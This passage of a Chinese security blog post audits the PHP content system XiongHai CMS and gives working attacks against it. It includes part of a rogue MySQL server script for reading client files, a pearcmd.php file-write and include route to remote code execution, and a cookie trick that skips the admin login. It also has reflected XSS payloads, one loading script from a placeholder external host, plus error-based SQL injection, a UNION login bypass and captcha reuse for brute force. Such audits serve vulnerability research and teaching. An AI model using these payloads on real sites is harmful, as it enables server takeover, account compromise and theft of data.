class="string">&quot;\x00\x00\x01\xFB&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">  stream_socket_shutdown(<span class="variable">$s</span>, STREAM_SHUT_WR);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;[+] <span class="subst">$filename</span> from <span class="subst">$peer</span>:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$len</span> = fread(<span class="variable">$s</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$len</span>)) &#123;</span><br><span class="line">    <span class="keyword">list</span> (, <span class="variable">$len</span>) = unpack(<span class="string">&quot;V&quot;</span>, <span class="variable">$len</span>);</span><br><span class="line">    <span class="variable">$len</span> &amp;= <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$len</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable">$chunk</span> = fread(<span class="variable">$s</span>, <span class="variable">$len</span>);</span><br><span class="line">      <span class="variable">$len</span> -= strlen(<span class="variable">$chunk</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$chunk</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">  fclose(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单测试一波成功读取到配置文件</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/18.png"></p><p>可惜后台也不能任意上传文件到admin的fiels目录下，而且config.json配置当中不支持json后缀，就到此结束吧</p><h3 id="真正的前台RCE"><a href="#真正的前台RCE" class="headerlink" title="真正的前台RCE"></a>真正的前台RCE</h3><p>因为是宝塔安装的缘故所以很容易猜测到宝塔php的安装路径<code>/www/server/php/52/</code>，这里介绍另一个trick的使用也就是pearcmd.php，<code>在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。</code>，这里这个老cms一定是只能5版本所以一定可以</p><p>因此构造payload，往/tmp/hello.php写文件即可</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/20.png"></p><p>之后文件包含成功RCE</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/21.png"></p><h2 id="逻辑绕过免密码登入后台-垂直越权"><a href="#逻辑绕过免密码登入后台-垂直越权" class="headerlink" title="逻辑绕过免密码登入后台-垂直越权"></a>逻辑绕过免密码登入后台-垂直越权</h2><p>鉴权函数很简单，所以只要设置cookie当中user为任意字符即可进入后台</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/19.png"></p><h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><p>既然默认是从files文件夹下做为路由的主文件，我们不妨先从files文件夹开始，文件也不多，在每个文件当中先做了一件事情，这部分没啥漏洞，r本来就是决定路由分发的，而且有addslashes无法逃逸单引号，除非能控制数据库内容可以形成xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/time.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM settings&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$info</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"><span class="variable">$llink</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM nav WHERE link=&#x27;<span class="subst">$llink</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$navs</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前台XSS1-突破addslashes字符限制"><a href="#前台XSS1-突破addslashes字符限制" class="headerlink" title="前台XSS1+突破addslashes字符限制"></a>前台XSS1+突破addslashes字符限制</h3><p>在contact.php当中，接收到page参数并回显，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span>&lt;&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$pages</span>=<span class="string">&quot;第&quot;</span>.<span class="variable">$page</span>.<span class="string">&quot;页 - &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以通过payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&lt;<span class="regexp">/a&gt;&lt;script&gt;alert(123)&lt;/</span>script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.png"></p><p>但是这里又有了一个新的问题，addslashes导致我们不能带引号，那怎么办呢？下面给一个解决方式，很简单就不多说啦，这里src可以不加引号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=contact&amp;page=<span class="number">2333</span>&lt;/a&gt;&lt;script src=http:<span class="comment">//xxxx/1.js&gt;&lt;/script&gt;&lt;a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png"></p><p>又或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=contact&amp;page=<span class="number">2333</span>&lt;/a&gt;&lt;script&gt;alert(/Hacked By y4tacker/)&lt;/script&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure><h3 id="前台XSS2"><a href="#前台XSS2" class="headerlink" title="前台XSS2"></a>前台XSS2</h3><p>在content页面，id可控制cookie也可控制不演示了，懂得都懂</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.png"></p><h3 id="前台XSS3-同样例子太多就不列举了"><a href="#前台XSS3-同样例子太多就不列举了" class="headerlink" title="前台XSS3-同样例子太多就不列举了"></a>前台XSS3-同样例子太多就不列举了</h3><p>这个更离谱，无过滤后面还有输出yema参数同样不演示了，没意义，同样的例子很多</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/8.png"></p><h3 id="前台SQL注入-content-software两个页面同理"><a href="#前台SQL注入-content-software两个页面同理" class="headerlink" title="前台SQL注入 content/software两个页面同理"></a>前台SQL注入 content/software两个页面同理</h3><p>由于有addslashes，造成不难逃逸引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;inc/time.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM settings&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$info</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;cid&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM content WHERE id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$content</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$navid</span>=<span class="variable">$content</span>[<span class="string">&#x27;navclass&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM navclass WHERE id=&#x27;<span class="subst">$navid</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$navs</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//浏览计数</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">@mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;修改错误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>造成update语句处的注入，当然这里<code>@mysql_query($query) or die(&#39;修改错误：&#39;.mysql_error());</code>会输出错误，所以报错注入就完事啦</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png"></p><p>有了sql注入，我们就能尝试拿到管理用户密码，在最上面我们说了密码只是简单md5所以可能造成撞库获取明文的风险</p><h3 id="验证码逻辑问题"><a href="#验证码逻辑问题" class="headerlink" title="验证码逻辑问题"></a>验证码逻辑问题</h3><p>可以看到这里验证码引入code.class.php</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png"></p><p>而这个文件直接把验证码放入session，这里还没啥问题</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png"></p><p>这里只是验证是否一致，如果一致也不会刷新，所以我们可以通过一个验证码来一直实现爆破需要验证码的页面如登陆等等</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png"></p><h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><p>很多参数都没过滤，随便注入了，只是有个限制就是需要验证码</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png"></p><p>配合上面验证码的逻辑漏洞可以实现随便注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cid=<span class="number">0</span>&amp;content=<span class="number">2</span>dsads笑死a333%<span class="number">40</span>&amp;jz=<span class="number">1</span>&amp;mail=<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select+version()))))%23&amp;name=asdas&amp;randcode=5x94&amp;save=提交&amp;tz=1&amp;url=asdsadsa</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png"></p><h3 id="万能密码进入后台"><a href="#万能密码进入后台" class="headerlink" title="万能密码进入后台"></a>万能密码进入后台</h3><p>和普通万能密码不一样，它需要查询到数据然后与结果中密码的比对<img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png"></p><p>因此只需要联合查询构造虚假数据即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST数据</span><br><span class="line">user=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span>y4tacker<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849<span class="string">b&#x27;,5,6,7,8%23</span></span><br><span class="line"><span class="string">password=1</span></span><br></pre></td></tr></table></figure><p>其中<code>md5(1)=c4ca4238a0b923820dcc509a6f75849b</code></p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><p>后台SQL注入有很多就不列举出来了没意义，其他的大概看了下后台没有文件上传,内嵌插件也不能上传(白名单的限制无法突破，也没有文件包含就没啥意义了)，除此以外还有个SSRF，但单个系统的SSRF没啥太大价值，除非有其他内网系统才能凸显其价值</p><h2 id="一个可行的RCE方案"><a href="#一个可行的RCE方案" class="headerlink" title="一个可行的RCE方案"></a>一个可行的RCE方案</h2><p>毕竟是熊海CMS，要求是低版本php5，那么如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制，这样我们就可以传图片马即可</p><p>又或者通过00截断控制后缀，不过也是有限制的，在 php 版本小于 5.3.4 而且GPC = Off 允许使用%00 截断，在使用 include 等文件包含函数，可以截 断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\0 截断会失败。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p><p><a target="_blank" rel="noopener" href="https://github.com/Al1ex/Rogue-MySql-Server">https://github.com/Al1ex/Rogue-MySql-Server</a></p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">熊海CMS代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B1%E6%AD%A4%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%89%8D%E5%8F%B0RCE"><span class="toc-number">1.1.1.</span> <span class="toc-text">由此可能存在的前台RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E9%85%8D%E5%90%88%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">前台配合目录穿越读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%89%8D%E5%8F%B0RCE"><span class="toc-number">1.1.3.</span> <span class="toc-text">真正的前台RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5%E5%90%8E%E5%8F%B0-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">逻辑绕过免密码登入后台-垂直越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0"><span class="toc-number">1.3.</span> <span class="toc-text">前台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS1-%E7%AA%81%E7%A0%B4addslashes%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.3.1.</span> <span class="toc-text">前台XSS1+突破addslashes字符限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS2"><span class="toc-number">1.3.2.</span> <span class="toc-text">前台XSS2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0XSS3-%E5%90%8C%E6%A0%B7%E4%BE%8B%E5%AD%90%E5%A4%AA%E5%A4%9A%E5%B0%B1%E4%B8%8D%E5%88%97%E4%B8%BE%E4%BA%86"><span class="toc-number">1.3.3.</span> <span class="toc-text">前台XSS3-同样例子太多就不列举了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5-content-software%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E5%90%8C%E7%90%86"><span class="toc-number">1.3.4.</span> <span class="toc-text">前台SQL注入 content&#x2F;software两个页面同理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.5.</span> <span class="toc-text">验证码逻辑问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.6.</span> <span class="toc-text">前台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-number">1.3.7.</span> <span class="toc-text">万能密码进入后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-number">1.4.</span> <span class="toc-text">后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%A1%8C%E7%9A%84RCE%E6%96%B9%E6%A1%88"><span class="toc-number">1.5.</span> <span class="toc-text">一个可行的RCE方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Y4教你审计系列之熊海CMS代码审计&body=Check out this article: https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=Y4教你审计系列之熊海CMS代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=Y4教你审计系列之熊海CMS代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2024 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
